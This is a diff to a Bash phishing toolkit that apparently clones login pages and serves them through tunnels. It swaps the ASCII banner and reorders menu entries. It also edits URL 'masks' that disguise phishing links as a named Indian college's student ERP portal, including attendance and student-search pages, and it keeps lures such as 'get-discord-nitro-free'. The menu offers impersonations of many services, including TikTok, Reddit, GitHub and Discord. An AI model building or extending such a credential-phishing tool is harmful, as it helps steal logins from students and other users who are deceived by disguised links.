@@ -141,10 +141,11 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE}░█░░░█░█░░░░█▀█░█░█░▀█▀░█▀▀░█░█
-		${ORANGE}░█░░░▄▀▄░░░░█▀▀░█▀█░░█░░▀▀█░█▀█
-		${ORANGE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀ ${RED}Version : 2.2
+		${GREEN}
+		${GREEN}        _     _ _______ __   _ _______ _______       _____  _     _ _____ _______ _     _ _______  ______
+		${GREEN} |       \___/  |_____| | \  | |       |______      |_____] |_____|   |   |______ |_____| |______ |_____/
+		${GREEN} |_____ _/   \_ |     | |  \_| |_____  |______      |       |     | __|__ ______| |     | |______ |    \_
+                                                                                                          ${RED}Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce(Prince Katiyar)${WHITE}
 	EOF
@@ -473,23 +474,23 @@ site_psit() {
 	case $REPLY in 
 		1 | 01)
 			website="psit"
-			mask='http://erp.psit.ac.in/'
+			mask='http://erp.psit.ac.in'
 			tunnel_menu;;
 		2 | 02)
 			website="psit"
-			mask='http://erp.psitche.ac.in/'
+			mask='http://erp.psitche.ac.in'
 			tunnel_menu;;
 		3 | 03)
 			website="psit"
-			mask='http://erp.psitche.ac.in/ERP/Student/Attendance/'
+			mask='http://erp.psitche.ac.in-ERP-Student-Attendance'
 			tunnel_menu;;
 		4 | 04)
 			website="psit"
-			mask='http://erp.psitche.ac.in/SearchStudents/'
+			mask='http://erp.psitche.ac.in-SearchStudents'
 			tunnel_menu;;
 		5 | 05)
 			website="psit"
-			mask='http://erp.psitche.ac.in/accessing/'
+			mask='http://erp.psitche.ac.in-accessing'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -643,7 +644,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord	${RED}[${WHITE}35${RED}]${ORANGE} Psit
+		${RED}[${WHITE}34${RED}]${ORANGE} ApnaPSIT      ${RED}[${WHITE}35${RED}]${ORANGE} Discord
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -777,11 +778,11 @@ main_menu() {
 			mask='http://get-1k-followers-on-github-free'
 			tunnel_menu;;
 		34)
+			site_psit;;
+		35)
 			website="discord"
 			mask='http://get-discord-nitro-free'
 			tunnel_menu;;
-		35)
-			site_psit;;
 		99)
 			about;;
 		0 | 00 )
